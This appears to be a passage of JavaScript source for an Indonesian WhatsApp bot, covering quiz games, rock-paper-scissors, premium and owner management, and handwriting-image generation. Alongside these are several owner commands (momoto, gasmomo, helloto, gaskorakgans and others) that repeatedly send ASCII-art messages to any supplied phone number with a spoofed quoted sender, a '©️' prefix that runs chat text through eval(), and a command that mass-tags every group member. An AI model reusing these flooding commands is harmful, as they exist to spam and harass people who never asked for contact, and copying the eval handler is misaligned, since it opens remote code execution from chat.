if (tebaklirik.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaklirik[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await rikibos.sendButtonText(m.chat, [{ buttonId: 'tebak lirik', buttonText: { displayText: 'Tebak Lirik' }, type: 1 }], `🎮 Tebak Lirik 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, rikibos.user.name, m)
delete tebaklirik[m.sender.split('@')[0]]
} else bangkal('*Jawaban Salah!*')
}
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
kuis = true
jawaban = tebaktebakan[m.sender.split('@')[0]]
if (budy.toLowerCase() == jawaban) {
await rikibos.sendButtonText(m.chat, [{ buttonId: 'tebak tebakan', buttonText: { displayText: 'Tebak Tebakan' }, type: 1 }], `🎮 Tebak Tebakan 🎮\n\nJawaban Benar 🎉\n\nIngin bermain lagi? tekan button dibawah`, rikibos.user.name, m)
delete tebaktebakan[m.sender.split('@')[0]]
} else bangkal('*Jawaban Salah!*')
}
//=================================================//
if (budy.startsWith('©️')) {
if (!isCreator) throw sticOwner(from)
if (isBan) throw sticBanLu(from)
try {
return m.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
m.reply(e)
}
}
//=================================================//
//Suit PvP
this.suit = this.suit ? this.suit : {}
let roof = Object.values(this.suit).find(roof => roof.id && roof.status && [roof.p, roof.p2].includes(m.sender))
if (roof) {
let win = ''
let tie = false
if (m.sender == roof.p2 && /^(acc(ept)?|terima|gas|oke?|tolak|gamau|nanti|ga(k.)?bisa|y)/i.test(m.text) && m.isGroup && roof.status == 'wait') {
if (/^(tolak|gamau|nanti|n|ga(k.)?bisa)/i.test(m.text)) {
rikibos.sendTextWithMentions(m.chat, `@${roof.p2.split`@`[0]} menolak suit, suit dibatalkan`, m)
delete this.suit[roof.id]
return !0
}
roof.status = 'play'
roof.asal = m.chat
clearTimeout(roof.waktu)
//delete roof[roof.id].waktu
rikibos.sendText(m.chat, `Suit telah dikirimkan ke chat

@${roof.p.split`@`[0]} dan 
@${roof.p2.split`@`[0]}

Silahkan pilih suit di chat masing"
klik https://wa.me/${botNumber.split`@`[0]}`, m, { mentions: [roof.p, roof.p2] })
if (!roof.pilih) rikibos.sendText(roof.p, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
if (!roof.pilih2) rikibos.sendText(roof.p2, `Silahkan pilih \n\nBatu🗿\nKertas📄\nGunting✂️`, m)
roof.waktu_milih = setTimeout(() => {
if (!roof.pilih && !roof.pilih2) rikibos.sendText(m.chat, `Kedua pemain tidak niat main,\nSuit dibatalkan`)
else if (!roof.pilih || !roof.pilih2) {
win = !roof.pilih ? roof.p2 : roof.p
rikibos.sendTextWithMentions(m.chat, `@${(roof.pilih ? roof.p2 : roof.p).split`@`[0]} tidak memilih suit, game berakhir`, m)
}
delete this.suit[roof.id]
return !0
}, roof.timeout)
}
let jwb = m.sender == roof.p
let jwb2 = m.sender == roof.p2
let g = /gunting/i
let b = /batu/i
let k = /kertas/i
let reg = /^(gunting|batu|kertas)/i
if (jwb && reg.test(m.text) && !roof.pilih && !m.isGroup) {
roof.pilih = reg.exec(m.text.toLowerCase())[0]
roof.text = m.text
bangkal(`Kamu telah memilih ${m.text} ${!roof.pilih2 ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih2) rikibos.sendText(roof.p2, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
if (jwb2 && reg.test(m.text) && !roof.pilih2 && !m.isGroup) {
roof.pilih2 = reg.exec(m.text.toLowerCase())[0]
roof.text2 = m.text
bangkal(`Kamu telah memilih ${m.text} ${!roof.pilih ? `\n\nMenunggu lawan memilih` : ''}`)
if (!roof.pilih) rikibos.sendText(roof.p, '_Lawan sudah memilih_\nSekarang giliran kamu', 0)
}
let stage = roof.pilih
let stage2 = roof.pilih2
if (roof.pilih && roof.pilih2) {
clearTimeout(roof.waktu_milih)
if (b.test(stage) && g.test(stage2)) win = roof.p
else if (b.test(stage) && k.test(stage2)) win = roof.p2
else if (g.test(stage) && k.test(stage2)) win = roof.p
else if (g.test(stage) && b.test(stage2)) win = roof.p2
else if (k.test(stage) && b.test(stage2)) win = roof.p
else if (k.test(stage) && g.test(stage2)) win = roof.p2
else if (stage == stage2) tie = true
rikibos.sendText(roof.asal, `_*Hasil Suit*_${tie ? '\nSERI' : ''}
@${roof.p.split`@`[0]} (${roof.text}) ${tie ? '' : roof.p == win ? ` Menang \n` : ` Kalah \n`}
@${roof.p2.split`@`[0]} (${roof.text2}) ${tie ? '' : roof.p2 == win ? ` Menang \n` : ` Kalah \n`}
`.trim(), m, { mentions: [roof.p, roof.p2] })
delete this.suit[roof.id]
}
}
//=================================================//
let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
bangkal(`
Apakah Ada Yang Ingin Di Tanyakan ${reason ? 'Ada Yang Bisa Saya Bantu? ' + reason : 'Terima Kasih'}
Waktu ${clockString(new Date - afkTime)}
`.trim())
}
if (db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
bangkal(`
Hello Saya Bot RIK BOT${user.afkReason ? ' Baiklah ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}
//=================================================//
switch(command) {
//=================================================//
case 'listpremium':
if (!m.key.fromMe && !isCreator) return replyNya(mess.owner)
teks = '*List Premium*\n\n'
for (let rikibos of prem) {
teks += `- ${rikibos}\n`
}
teks += `\n*Total : ${prem.length}*`
rikibos.sendMessage(from, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": prem } })
break
case 'addprem':
if (!m.key.fromMe && !isCreator) return replyNya(mess.owner)
bnnd = `${args[0].replace('@', '')}@s.whatsapp.net`
prem.push(bnnd)
fs.writeFileSync('./rikilah/Database/premium.json', JSON.stringify(prem))
reply(`Nomor ${bnnd} Telah Menjadi Premium!`)
break
case 'delprem':
if (!m.key.fromMe && !isCreator) return replyNya(mess.owner)
yaa = `${args[0].replace('@', '')}@s.whatsapp.net`
unp = prem.indexOf(yaa)
prem.splice(unp, 1)
fs.writeFileSync('./rikilah/Database/premium.json', JSON.stringify(prem))
reply(`Nomor ${yaa} Telah Di Hapus Premium!`)
break
case 'addowner':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isCreator) return reply(mess.owner)
if (!args[0]) return reply(`Contoh ${prefix+command} 628×××××`)
bnnd = `${args[0].replace('@', '')}`
owner.push(bnnd)
fs.writeFileSync('./rikilah/Database/cowner.json', JSON.stringify(owner))
reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
break
case 'delowner':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!isCreator) return sticOwner(mess.owner)
if (!args[0]) return reply(`Contoh ${prefix+command} 628×××××`)
yaa = `${args[0].replace('@', '')}`
unp = owner.indexOf(yaa)
owner.splice(unp, 1)
fs.writeFileSync('./rikilah/Database/cowner.json', JSON.stringify(owner))
reply(`Nomor ${ya} Telah Di Hapus Owner!!!`)
break
case 'inibug': {
if (!isRegistered) return replyReg(mess.verif)
if (!isPrem) return replyPremium(mess.premium)
if (isBan) throw sticBanLu(from)
let teks = `══✪〘 *BANG INI BUG ? ☺️* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
rikibos.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: doc })
}
break
case 'nulis':
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (!q) return reply(`Teks nulis nya apa kak?`)
let fejfjej = [
{
"title": `NULIS BUKU`,
 rows: [
{
"title": `KANAN`,
"rowId": `${prefix}nuliskanan ${q}`
}
,
{
"title": `KIRI`,
"rowId": `${prefix}nuliskiri ${q}`
}
]
}
,
{
"title": `NULIS FOLIO`,
 rows: [
{
"title": `KANAN`,
"rowId": `${prefix}foliokanan ${q}`
}
,
{
"title": `KIRI`,
"rowId": `${prefix}foliokiri ${q}`
}
]
}
]
rikibos.sendList(m.chat, `Haii *${pushname}*`, `Silahkan Pilih Di Bawah`, "CLICK", "Fitur Nulis RIK OOHz ", fejfjej, { quoted: m })
break
case 'nuliskiri':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
if (args.length < 1) return replyNya(`Kirim perintah *${prefix}nuliskiri* teks`)
replyNya(mess.wait)
var tulisan = body.slice(11)
var splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')
var fixHeight = splitText.split('\n').slice(0, 31).join('\n')
spawn('convert', ['./Bos/FOTO/BUKU/sebelumkiri.jpg','-font','./Bos/FONT/Indie-Flower.ttf','-size','970x1280','-pointsize','23','-interline-spacing','2','-annotate','+140+153',fixHeight,'./Bos/FOTO/BUKU/setelahkiri.jpg'])
.on('error', () => reply('error'))
.on('exit', () => {
rikibos.sendMessage(from, { image: fs.readFileSync('./Bos/FOTO/BUKU/setelahkiri.jpg'), contextInfo: {
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"title": `Hai Kak ${pushname}👋🏻`, 
"mediaType": 2, 
"thumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://youtube.com/c/KATANAMODS',
"sourceUrl": 'https://www.youtube.com/c/katanamods'}}}, {quoted: m, caption: `Jangan Malas Kak...`})
})
}
break
case 'nuliskanan':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
                if (args.length < 1) return replyNya(`Kirim perintah *${prefix}nuliskanan* teks`)
replyNya(mess.wait)
                var tulisan = body.slice(12)
                var splitText = tulisan.replace(/(\S+\s*){1,9}/g, '$&\n')
                var fixHeight = splitText.split('\n').slice(0, 31).join('\n')
                spawn('convert', ['./Bos/FOTO/BUKU/sebelumkanan.jpg','-font','./Bos/FONT/Indie-Flower.ttf','-size','970x1280','-pointsize','23','-interline-spacing','2','-annotate','+128+129',fixHeight,'./Bos/FOTO/BUKU/setelahkanan.jpg'])
                .on('error', () => reply('error'))
                .on('exit', () => {
                rikibos.sendMessage(from, { image: fs.readFileSync('./Bos/FOTO/BUKU/setelahkanan.jpg'), contextInfo: {
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"title": `Hai Kak ${pushname}👋🏻`, 
"mediaType": 2, 
"thumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://youtube.com/c/KATANAMODS',
"sourceUrl": 'https://www.youtube.com/c/katanamods'}}}, {quoted: m, caption: `Jangan Malas Kak...`})
                })
            }
                break
case 'foliokiri':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
                if (args.length < 1) return replyNya(`Kirim perintah *${prefix}foliokiri* teks`)
replyNya(mess.wait)
                var tulisan = body.slice(11)
                var splitText = tulisan.replace(/(\S+\s*){1,13}/g, '$&\n')
                var fixHeight = splitText.split('\n').slice(0, 38).join('\n')
                spawn('convert', ['./Bos/FOTO/FOLIO/sebelumkiri.jpg','-font','./Bos/FONT/Indie-Flower.ttf','-size','1720x1280','-pointsize','23','-interline-spacing','4','-annotate','+48+185',fixHeight,'./Bos/FOTO/FOLIO/setelahkiri.jpg'])
                .on('error', () => reply('error'))
                .on('exit', () => {
                rikibos.sendMessage(from, { image: fs.readFileSync('./Bos/FOTO/FOLIO/setelahkiri.jpg'), contextInfo: {
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"title": `Hai Kak ${pushname}👋🏻`, 
"mediaType": 2, 
"thumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://youtube.com/c/KATANAMODS',
"sourceUrl": 'https://www.youtube.com/c/katanamods'}}}, {quoted: m, caption: `Jangan Malas Kak...`})
                })
            }
                break
case 'foliokanan':{
if (isBan) return replyBan('Maaf Kamu Sudah Di Ban Silahkan Chat Owner Di Bawah Untuk Membuka Nya')
                if (args.length < 1) return replyNya(`Kirim perintah *${prefix}foliokanan* teks`)
replyNya(mess.wait)
                var tulisan = body.slice(12)
                var splitText = tulisan.replace(/(\S+\s*){1,13}/g, '$&\n')
                var fixHeight = splitText.split('\n').slice(0, 38).join('\n')
                spawn('convert', ['./Bos/FOTO/FOLIO/sebelumkanan.jpg','-font','./Bos/FONT/Indie-Flower.ttf','-size','960x1280','-pointsize','23','-interline-spacing','3','-annotate','+89+190',fixHeight,'./Bos/FOTO/FOLIO/setelahkanan.jpg'])
                .on('error', () => reply(mess.error.api))
                .on('exit', () => {
                rikibos.sendMessage(from, { image: fs.readFileSync('./Bos/FOTO/FOLIO/setelahkanan.jpg'), contextInfo: {
"mentionedJid": [sender],
"externalAdReply": {
"showAdAttribution": true,
"title": `Hai Kak ${pushname}👋🏻`, 
"mediaType": 2, 
"thumbnail": ppnyauser,
"previewType": "VIDEO",
"mediaUrl": 'https://youtube.com/c/KATANAMODS',
"sourceUrl": 'https://www.youtube.com/c/katanamods'}}}, {quoted: m, caption: `Jangan Malas Kak...`})
                })
            }
                break
//=================================================//
case 'momo': {            
          if (!isCreator) return
             momoe = `
///....▓▓▓▓
///..▓▓......▓
///..▓▓......▓▓..................▓▓▓▓
///..▓▓......▓▓..............▓▓......▓▓▓▓
///..▓▓....▓▓..............▓......▓▓......▓▓
///....▓▓....▓............▓....▓▓....▓▓▓....▓▓
///......▓▓....▓........▓....▓▓..........▓▓....▓
///........▓▓..▓▓....▓▓..▓▓................▓▓
///........▓▓......▓▓....▓▓
///.......▓......................▓
///.....▓.........................▓
///....▓......^..........^......▓
///....▓...........❤...........▓
///....▓..........................▓
///.....▓..........ٮ..........▓
///.........▓▓..........▓▓
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
                            "jpegThumbnail": log0
                        } 
                    } 
                }
            await rikibos.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await rikibos.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await rikibos.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            }
            break
          case 'momoto': { 
          if (!isCreator) return
          if (!text) throw `MANA NOMORNYA?` 
             momoe = `
///....▓▓▓▓
///..▓▓......▓
///..▓▓......▓▓..................▓▓▓▓
///..▓▓......▓▓..............▓▓......▓▓▓▓
///..▓▓....▓▓..............▓......▓▓......▓▓
///....▓▓....▓............▓....▓▓....▓▓▓....▓▓
///......▓▓....▓........▓....▓▓..........▓▓....▓
///........▓▓..▓▓....▓▓..▓▓................▓▓
///........▓▓......▓▓....▓▓
///.......▓......................▓
///.....▓.........................▓
///....▓......^..........^......▓
///....▓...........❤...........▓
///....▓..........................▓
///.....▓..........ٮ..........▓
///.........▓▓..........▓▓
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
                            "jpegThumbnail": log0
                        } 
                    } 
                }
            await rikibos.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await rikibos.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await rikibos.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            m.reply('Sukses Mas Bro')
            }
            break
          case 'gasmomo': {            
          if (!isCreator) return
           if (!text) throw `MANA NOMORNYA?`       
             momoe = `
///....▓▓▓▓
///..▓▓......▓
///..▓▓......▓▓..................▓▓▓▓
///..▓▓......▓▓..............▓▓......▓▓▓▓
///..▓▓....▓▓..............▓......▓▓......▓▓
///....▓▓....▓............▓....▓▓....▓▓▓....▓▓
///......▓▓....▓........▓....▓▓..........▓▓....▓
///........▓▓..▓▓....▓▓..▓▓................▓▓
///........▓▓......▓▓....▓▓
///.......▓......................▓
///.....▓.........................▓
///....▓......^..........^......▓
///....▓...........❤...........▓
///....▓..........................▓
///.....▓..........ٮ..........▓
///.........▓▓..........▓▓
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
                            "jpegThumbnail": log0
                        } 
                    } 
                }
            await rikibos.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await rikibos.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await rikibos.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await rikibos.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await rikibos.sendMessage(m.chat, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            await rikibos.sendMessage(`${text}@s.whatsapp.net`, {text:momoe},{quoted:asukonyol11})
            await sleep(30000)
            m.reply('Sukses Mas Bro')
            }
            break
case 'hello': {            
          if (!isCreator) return
             halo = `///╭━━╮┈┈┈╭━━╮┈┈┈┈┈
///┃╭╮┣━━━┫╭╮┃┈╭┳┳╮
///╰━┳╯▆┈▆╰┳━╯┈┃┃┃┃
///┈┈┃┓┈◯┈┏┃┈┈╭┫┗┗┃
///┈┈┃╰┳┳┳╯┃┈┈┃┃╭━┃
///╭━┻╮┗┻┛╭┻━╮╰┳━┳╯
///┃┈┈╰━━━╯┈┈╰━┛┈┃┈
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
                            "jpegThumbnail": log0
                        } 
                    } 
                }
await rikibos.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
await rikibos.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
await rikibos.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
m.reply('Sukses Mas Bro')
}
            break
case 'helloto': {            
          if (!isCreator) return
          if (!text) throw `MANA NOMORNYA?`
             halo = `///╭━━╮┈┈┈╭━━╮┈┈┈┈┈
///┃╭╮┣━━━┫╭╮┃┈╭┳┳╮
///╰━┳╯▆┈▆╰┳━╯┈┃┃┃┃
///┈┈┃┓┈◯┈┏┃┈┈╭┫┗┗┃
///┈┈┃╰┳┳┳╯┃┈┈┃┃╭━┃
///╭━┻╮┗┻┛╭┻━╮╰┳━┳╯
///┃┈┈╰━━━╯┈┈╰━┛┈┃┈
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
                            "jpegThumbnail": log0
                        } 
                    } 
                }
await rikibos.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
await rikibos.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
await rikibos.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
m.reply('Sukses Mas Bro')
}
            break
case 'gashello': {            
          if (!isCreator) return
          if (!text) throw `MANA NOMORNYA?`
             halo = `///╭━━╮┈┈┈╭━━╮┈┈┈┈┈
///┃╭╮┣━━━┫╭╮┃┈╭┳┳╮
///╰━┳╯▆┈▆╰┳━╯┈┃┃┃┃
///┈┈┃┓┈◯┈┏┃┈┈╭┫┗┗┃
///┈┈┃╰┳┳┳╯┃┈┈┃┃╭━┃
///╭━┻╮┗┻┛╭┻━╮╰┳━┳╯
///┃┈┈╰━━━╯┈┈╰━┛┈┃┈
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
                            "jpegThumbnail": log0
                        } 
                    } 
                }
await rikibos.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await rikibos.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await rikibos.sendMessage(m.chat, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
await rikibos.sendMessage(`${text}@s.whatsapp.net`, {text:halo},{quoted:asukonyol11})
            await sleep(30000)
            m.reply('Sukses Mas Bro')
            }
            break
case 'korakgans': {            
          if (!isCreator) return
             korak = `
────────▄▄▄▄▄▄▄▄▄
────────▌▐░▀░▀░▀▐
────────▌░▌░░░░░▐
────────▌░░░░░░░▐
────────▄▄▄▄▄▄▄▄▄
──▄▀▀▀▀▀▌▄█▄░▄█▄▐▀▀▀▀▀▄
─█▒▒▒▒▒▐░░░░▄░░░░▌▒▒▒▒▒█
▐▒▒▒▒▒▒▒▌░░░░░░░▐▒▒▒▒▒▒▒▌
▐▒▒▒▒▒▒▒█░▀▀▀▀▀░█▒▒▒▒▒▒▒▌
▐▒▒▒▒▒▒▒▒█▄▄▄▄▄█▒▒▒▒▒▒▒▒▌
▐▒▒▒▒▐▒▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▒▌
▐▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▌
▐▒▒▒▒▒▐▒▒▒▒▒▒▒▒▒▒▒▌▒▒▒▒▒▌
▐▒▒▒▒▒▒▌▒▒▒▒▒▒▒▒▒▐▒▒▒▒▒▒▌
▐▒▒▒▒▒▒▌▄▄▄▄▄▄▄▄▄▐▒▒▒▒▒▒▌
▐▄▄▄▄▄▄▌▌███████▌▐▄▄▄▄▄▄▌
─█▀▀▀▀█─▌███▌███▌─█▀▀▀▀█
─▐░░░░▌─▌███▌███▌─▐░░░░▌
──▀▀▀▀──▌███▌███▌──▀▀▀▀
────────▌███▌███▌
────────▌███▌███▌
──────▐▀▀▀██▌█▀▀▀▌
▒▒▒▒▒▒▐▄▄▄▄▄▄▄▄▄▄▌▒▒▒▒▒▒▒
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
                            "jpegThumbnail": log0
                        } 
                    } 
                }
await rikibos.sendMessage(m.chat, {text:korak},{quoted:asukonyol11})
await rikibos.sendMessage(m.chat, {text:korak},{quoted:asukonyol11})
await rikibos.sendMessage(m.chat, {text:korak},{quoted:asukonyol11})
m.reply('Sukses Mas Bro')
}
            break
case 'korakgansto': {            
          if (!isCreator) return
if (!text) throw `MANA NOMORNYA?`
             korak = `
────────▄▄▄▄▄▄▄▄▄
────────▌▐░▀░▀░▀▐
────────▌░▌░░░░░▐
────────▌░░░░░░░▐
────────▄▄▄▄▄▄▄▄▄
──▄▀▀▀▀▀▌▄█▄░▄█▄▐▀▀▀▀▀▄
─█▒▒▒▒▒▐░░░░▄░░░░▌▒▒▒▒▒█
▐▒▒▒▒▒▒▒▌░░░░░░░▐▒▒▒▒▒▒▒▌
▐▒▒▒▒▒▒▒█░▀▀▀▀▀░█▒▒▒▒▒▒▒▌
▐▒▒▒▒▒▒▒▒█▄▄▄▄▄█▒▒▒▒▒▒▒▒▌
▐▒▒▒▒▐▒▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▒▌
▐▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▌
▐▒▒▒▒▒▐▒▒▒▒▒▒▒▒▒▒▒▌▒▒▒▒▒▌
▐▒▒▒▒▒▒▌▒▒▒▒▒▒▒▒▒▐▒▒▒▒▒▒▌
▐▒▒▒▒▒▒▌▄▄▄▄▄▄▄▄▄▐▒▒▒▒▒▒▌
▐▄▄▄▄▄▄▌▌███████▌▐▄▄▄▄▄▄▌
─█▀▀▀▀█─▌███▌███▌─█▀▀▀▀█
─▐░░░░▌─▌███▌███▌─▐░░░░▌
──▀▀▀▀──▌███▌███▌──▀▀▀▀
────────▌███▌███▌
────────▌███▌███▌
──────▐▀▀▀██▌█▀▀▀▌
▒▒▒▒▒▒▐▄▄▄▄▄▄▄▄▄▄▌▒▒▒▒▒▒▒
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
                            "jpegThumbnail": log0
                        } 
                    } 
                }
await rikibos.sendMessage(`${text}@s.whatsapp.net`, {text:korak},{quoted:asukonyol11})
await rikibos.sendMessage(`${text}@s.whatsapp.net`, {text:korak},{quoted:asukonyol11})
await rikibos.sendMessage(`${text}@s.whatsapp.net`, {text:korak},{quoted:asukonyol11})
m.reply('Sukses Mas Bro')
}
            break
case 'gaskorakgans': {            
          if (!isCreator) return
if (!text) throw `MANA NOMORNYA?`
             korak = `
────────▄▄▄▄▄▄▄▄▄
────────▌▐░▀░▀░▀▐
────────▌░▌░░░░░▐
────────▌░░░░░░░▐
────────▄▄▄▄▄▄▄▄▄
──▄▀▀▀▀▀▌▄█▄░▄█▄▐▀▀▀▀▀▄
─█▒▒▒▒▒▐░░░░▄░░░░▌▒▒▒▒▒█
▐▒▒▒▒▒▒▒▌░░░░░░░▐▒▒▒▒▒▒▒▌
▐▒▒▒▒▒▒▒█░▀▀▀▀▀░█▒▒▒▒▒▒▒▌
▐▒▒▒▒▒▒▒▒█▄▄▄▄▄█▒▒▒▒▒▒▒▒▌
▐▒▒▒▒▐▒▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▒▌
▐▒▒▒▒▒█▒▒▒▒▒▒▒▒▒▒▒█▒▒▒▒▒▌
▐▒▒▒▒▒▐▒▒▒▒▒▒▒▒▒▒▒▌▒▒▒▒▒▌
▐▒▒▒▒▒▒▌▒▒▒▒▒▒▒▒▒▐▒▒▒▒▒▒▌
▐▒▒▒▒▒▒▌▄▄▄▄▄▄▄▄▄▐▒▒▒▒▒▒▌
▐▄▄▄▄▄▄▌▌███████▌▐▄▄▄▄▄▄▌
─█▀▀▀▀█─▌███▌███▌─█▀▀▀▀█
─▐░░░░▌─▌███▌███▌─▐░░░░▌
──▀▀▀▀──▌███▌███▌──▀▀▀▀
────────▌███▌███▌
────────▌███▌███▌
──────▐▀▀▀██▌█▀▀▀▌
▒▒▒▒▒▒▐▄▄▄▄▄▄▄▄▄▄▌▒▒▒▒▒▒▒
`
             asukonyol11 = { 
                    key: { 
                        fromMe: false, 
                        participant: `0@s.whatsapp.net`, 
                        ...({ remoteJid: "" }) 
                    }, 
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `𝐑𝐈𝐊 - 𝐎𝐎𝐇𝐳`,
                            "jpegThumbnail": log0
                        } 
                    } 
                }
await rikibos.sendMessage(m.chat, {text:korak},{quoted:asukonyol11})
            await sleep(30000)
await rikibos.sendMessage(`${text}@s.whatsapp.net`, {text:korak},{quoted:asukonyol11})
            await sleep(30000)
await rikibos.sendMessage(m.chat, {text:korak},{quoted:asukonyol11})
            await sleep(30000)
await rikibos.sendMessage(`${text}@s.whatsapp.net`, {text:korak},{quoted:asukonyol11})
            await sleep(30000)
            m.reply('Sukses Mas Bro')
            }
            break
case 'mukajelek': {            
          if (!isCreator) return
             korak = `
░░░░░░░░███████████████░░░░░░░░
░░░░░█████████████████████░░░░░
░░░░████████████████████████░░░
░░░██████████████████████████░░
░░█████████████████████████████
░░███████████▀░░░░░░░░░████████
░░███████████░░░░░░░░░░░░░░░███
░████████████░░░░░░░░░░░░░░░░██
░█░░███████░░░░░░░░░░░▄▄░░░░░██
█░░░░█████░░░░░░▄███████░░██░░█
█░░█░░░███░░░░░██▀▀░░░░░░░░██░█
█░░░█░░░░░░░░░░░░▄██▄░░░░░░░███
█░░▄█░░░░░░░░░░░░░░░░░░█▀▀█▄░██
█░░░░░░░░░░░░░░░░░░░░░░█░░░░██░
░███░░░░░░░░░░░░░░░░░░░█░░░░█░░
░░█░█░░░░░░░█░░░░░██▀▄░▄██░░░█░
░░█░█░░░░░░█░░░░░░░░░░░░░░░░░█░
░░░██░░░░░░█░░░░▄▄▄▄▄▄░░░░░░█░░
